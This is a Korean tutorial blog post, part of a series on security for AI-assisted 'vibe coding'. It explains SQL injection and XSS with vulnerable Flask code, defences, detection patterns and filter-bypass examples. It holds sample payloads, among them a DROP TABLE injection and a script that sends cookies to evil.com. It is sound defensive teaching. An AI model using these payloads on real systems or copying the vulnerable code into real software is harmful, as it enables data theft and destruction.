---
series: information-security-101
episode: 6
title: "바이브코딩을 위한 정보 보안 기초 (6/10): SQL 인젝션과 XSS"
status: publish-ready
targets:
  wordpress: true
tags:
  - 바이브코딩
  - 정보보안
  - SQL인젝션
  - XSS
  - 입력검증
  - AI보안
language: ko
---

# 바이브코딩을 위한 정보 보안 기초 (6/10): SQL 인젝션과 XSS

이 글은 **바이브코딩을 위한 정보 보안 기초** 시리즈의 6편입니다. AI가 만들어주는 코드에는 보안 취약점이 숨어 있을 수 있습니다. 이번에는 수십 년 된 취약점이면서도 AI 생성 코드에서 여전히 자주 발견되는 SQL 인젝션과 XSS를 다룹니다.

---

AI에게 "사용자 이름으로 검색하는 기능을 만들어줘"라고 하면 동작하는 코드가 나옵니다. 그런데 그 코드가 문자열 연결로 SQL 쿼리를 만들거나, 사용자 입력을 HTML에 그대로 출력하는 경우가 있습니다. AI는 기능을 만드는 데 집중하기 때문에 입력값이 코드로 해석될 수 있다는 것을 항상 챙기지는 않습니다.

> "SQL 인젝션과 XSS는 같은 뿌리를 가집니다. 신뢰할 수 없는 입력이 코드로 해석되는 것입니다. AI가 f-string으로 SQL을 만들거나 innerHTML에 사용자 입력을 넣는 코드를 만들었다면, 그 입력창은 공격자에게 열린 문입니다."

## 이 글에서 다룰 질문들

- SQL 인젝션은 어떤 메커니즘으로 발생할까요?
- ORM을 쓰면 SQL 인젝션에서 안전할까요?
- Reflected XSS, Stored XSS, DOM XSS는 어떻게 다를까요?
- 입력 필터링만으로 왜 부족할까요?
- AI가 만든 코드에서 두 취약점을 어떻게 빠르게 탐지할까요?

---

## 바이브코딩 관점: AI가 가장 자주 만드는 취약한 패턴

### Before: SQL 인젝션 — AI의 전형적인 실수

```python
# AI가 자주 생성하는 패턴: f-string으로 SQL 쿼리 조합
def get_user(username):
    query = f"SELECT * FROM users WHERE username = '{username}'"
    return db.execute(query)

# 공격 예시:
# username = "admin' OR '1'='1"
# 실행되는 쿼리: SELECT * FROM users WHERE username = 'admin' OR '1'='1'
# 결과: 모든 사용자 레코드 반환

# username = "'; DROP TABLE users; --"
# 실행되는 쿼리: SELECT * FROM users WHERE username = ''; DROP TABLE users; --'
# 결과: users 테이블 삭제 (DBMS에 따라 다름)
```

### After: 파라미터 바인딩으로 방어

```python
# 파라미터 바인딩: 입력값은 항상 데이터로만 처리
def get_user_safe(username: str):
    # 방법 1: 파라미터 바인딩 — 입력값을 SQL로 해석하지 않음
    query = "SELECT id, username, email FROM users WHERE username = ?"
    return db.execute(query, (username,))

# 방법 2: ORM 사용 (SQLAlchemy)
from sqlalchemy.orm import Session

def get_user_orm(session: Session, username: str):
    return session.query(User).filter(User.username == username).first()
    # ORM이 자동으로 파라미터 바인딩 처리

# ORM도 주의: raw SQL 메서드를 쓰면 취약점 재발
def get_user_orm_wrong(session: Session, username: str):
    # 이렇게 하면 ORM을 써도 SQL 인젝션 가능
    return session.execute(f"SELECT * FROM users WHERE username='{username}'")
```

---

## XSS: AI가 자주 만드는 세 가지 패턴

```python
# Reflected XSS — 요청에서 바로 반환
@app.route("/search")
def search():
    query = request.args.get("q", "")
    # AI 생성 패턴: 입력을 HTML에 직접 삽입
    return f"<p>검색 결과: {query}</p>"
    # 공격: /search?q=<script>document.location='https://evil.com?c='+document.cookie</script>

# Stored XSS — DB에 저장했다가 다른 사용자에게 렌더링
@app.route("/comment", methods=["POST"])
def save_comment():
    comment = request.form["comment"]
    db.save_comment(comment)  # 스크립트가 그대로 저장됨

@app.route("/comments")
def show_comments():
    comments = db.get_comments()
    # AI 생성 패턴: DB에서 꺼낸 내용을 이스케이핑 없이 출력
    return "".join(f"<li>{c}</li>" for c in comments)
```

```python
# 방어: 출력 이스케이핑
from markupsafe import escape  # Flask에서 사용 가능
from html import escape as html_escape

# Reflected XSS 방어
@app.route("/search")
def search_safe():
    query = request.args.get("q", "")
    safe_query = escape(query)  # HTML 특수문자 이스케이핑
    return f"<p>검색 결과: {safe_query}</p>"

# 템플릿 엔진 사용 (자동 이스케이핑)
# Jinja2는 {{ variable }}을 자동으로 이스케이핑
# {{ variable | safe }}를 쓰면 이스케이핑을 끄는 것 — AI가 자주 추가하는 위험한 패턴
```

---

## AI 코드에서 두 취약점을 빠르게 탐지하는 방법

```python
# SQL 인젝션 탐지 패턴 — 아래 패턴이 있으면 위험 신호
dangerous_sql_patterns = [
    'f"SELECT',           # f-string SQL 쿼리
    "f'SELECT",
    '% (username',        # % 포맷팅
    '.format(username',   # .format() 포맷팅
    "execute(query +",    # 문자열 연결
]

# XSS 탐지 패턴 — 아래 패턴이 있으면 위험 신호
dangerous_xss_patterns = [
    "innerHTML =",        # 직접 HTML 삽입
    "document.write(",    # 직접 쓰기
    "| safe",             # Jinja2 safe 필터
    "return f'<",         # f-string HTML 반환
    "return f\"<",
]

# AI에게 직접 물어보기
# "이 코드에서 SQL 인젝션이 가능한 부분이 있나요?"
# "사용자 입력이 HTML에 직접 출력되는 부분이 있나요?"
```

---

## 입력 필터링만으로 부족한 이유

```python
# 잘못된 방어: 입력 필터링으로 특정 문자 차단
def unsafe_filter(user_input: str) -> str:
    # 문제: 공격자는 우회 방법을 찾는다
    dangerous = ["'", '"', ";", "--", "DROP", "SELECT"]
    for d in dangerous:
        user_input = user_input.replace(d, "")
    return user_input

# 우회 예시:
# "SELSELECTECT" → 필터링 후 "SELECT" (중간에 키워드 삽입)
# "%27" → URL 디코딩 후 "'" (인코딩 우회)
# 대소문자 변형: "sElEcT"

# 올바른 방어: 컨텍스트 기반 이스케이핑 + 파라미터 바인딩
# 입력을 "정화"하는 것이 아니라
# 출력 컨텍스트에 맞게 "처리"하는 것이 핵심
```

---

## 자주 하는 실수

| 실수 | 설명 | 올바른 접근 |
| --- | --- | --- |
| f-string으로 SQL 조합 | 입력값이 SQL로 실행됨 | 파라미터 바인딩 또는 ORM |
| ORM을 쓰면 안전하다고 생각 | raw SQL 메서드는 여전히 위험 | ORM의 raw SQL 사용 시 파라미터 바인딩 확인 |
| innerHTML에 사용자 입력 삽입 | Stored/Reflected XSS 가능 | textContent 또는 DOMPurify |
| Jinja2에서 `{{ var | safe }}` | 이스케이핑 비활성화 → XSS | safe 필터 없이 자동 이스케이핑 사용 |

---

## AI 팁: SQL 인젝션과 XSS를 예방하는 AI 활용법

1. **SQL 점검**: "이 코드에서 사용자 입력이 SQL에 직접 들어가는 부분을 찾아주세요"
2. **XSS 점검**: "사용자 입력이 이스케이핑 없이 HTML에 출력되는 부분이 있나요?"
3. **파라미터 바인딩 요청**: "SQL 쿼리를 f-string 대신 파라미터 바인딩 방식으로 바꿔주세요"
4. **safe 필터 확인**: "Jinja2 템플릿에서 `| safe` 필터가 사용된 곳을 알려주세요"

---

## 실전 체크리스트

- [ ] SQL 쿼리가 모두 파라미터 바인딩을 사용하고 있다
- [ ] f-string, % 포맷팅, .format()으로 SQL을 조합하는 코드가 없다
- [ ] ORM의 raw SQL 메서드 사용 시 파라미터를 넘기고 있다
- [ ] 사용자 입력이 HTML에 출력될 때 이스케이핑이 되어 있다
- [ ] Jinja2에서 `{{ var | safe }}`를 꼭 필요한 경우에만 사용한다
- [ ] innerHTML에 사용자 입력을 직접 넣지 않는다

---

## 처음 질문으로 돌아가기

- **SQL 인젝션은 어떤 메커니즘으로 발생할까요?**
  사용자 입력이 SQL 쿼리 문자열에 직접 포함될 때 발생합니다. 공격자는 입력에 SQL 문법을 넣어서 쿼리의 의미를 바꿉니다. 파라미터 바인딩은 입력값을 항상 "데이터"로만 처리해서 이를 막습니다.

- **ORM을 쓰면 SQL 인젝션에서 안전할까요?**
  대부분의 ORM 표준 메서드는 안전합니다. 하지만 `execute(f"SELECT...")`처럼 raw SQL을 f-string으로 넘기면 ORM을 써도 SQL 인젝션이 발생합니다.

- **입력 필터링만으로 왜 부족할까요?**
  공격자는 인코딩, 대소문자, 우회 패턴으로 필터를 피합니다. 입력을 "정화"하는 것보다 출력 컨텍스트에 맞게 파라미터 바인딩이나 이스케이핑을 적용하는 것이 근본적인 방어입니다.

---

## 정리

SQL 인젝션과 XSS는 수십 년 된 취약점이지만 AI 생성 코드에서도 자주 발견됩니다. AI는 빠르게 작동하는 코드를 만들면서 파라미터 바인딩과 출력 이스케이핑을 빠뜨릴 수 있습니다. 코드를 받을 때 f-string SQL과 HTML 직접 출력을 먼저 확인하는 습관이 두 취약점을 막는 가장 효과적인 방법입니다. 다음 글에서는 비밀 정보 관리를 바이브코딩 관점에서 다룹니다.

---

## 참고 자료

- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger Web Security Academy — SQL Injection](https://portswigger.net/web-security/sql-injection)
- [DOMPurify — XSS sanitization 라이브러리](https://github.com/cure53/DOMPurify)

---

<!-- toc:begin -->
## 시리즈 목차

- [바이브코딩을 위한 정보 보안 기초 (1/10): 정보보안이란 무엇인가?](./01-what-is-information-security.md)
- [바이브코딩을 위한 정보 보안 기초 (2/10): 인증과 인가](./02-authentication-and-authorization.md)
- [바이브코딩을 위한 정보 보안 기초 (3/10): 암호화와 해시](./03-cryptography-and-hash.md)
- [바이브코딩을 위한 정보 보안 기초 (4/10): TLS와 인증서](./04-tls-and-certificates.md)
- [바이브코딩을 위한 정보 보안 기초 (5/10): 웹 보안 기초](./05-web-security-basics.md)
- **바이브코딩을 위한 정보 보안 기초 (6/10): SQL 인젝션과 XSS (현재 글)**
- 바이브코딩을 위한 정보 보안 기초 (7/10): 비밀 정보 관리
- 바이브코딩을 위한 정보 보안 기초 (8/10): 권한 최소화
- 바이브코딩을 위한 정보 보안 기초 (9/10): 로그와 감사
- 바이브코딩을 위한 정보 보안 기초 (10/10): 보안 사고 대응
<!-- toc:end -->

Tags: 바이브코딩, 정보보안, SQL인젝션, XSS, 입력검증, AI보안
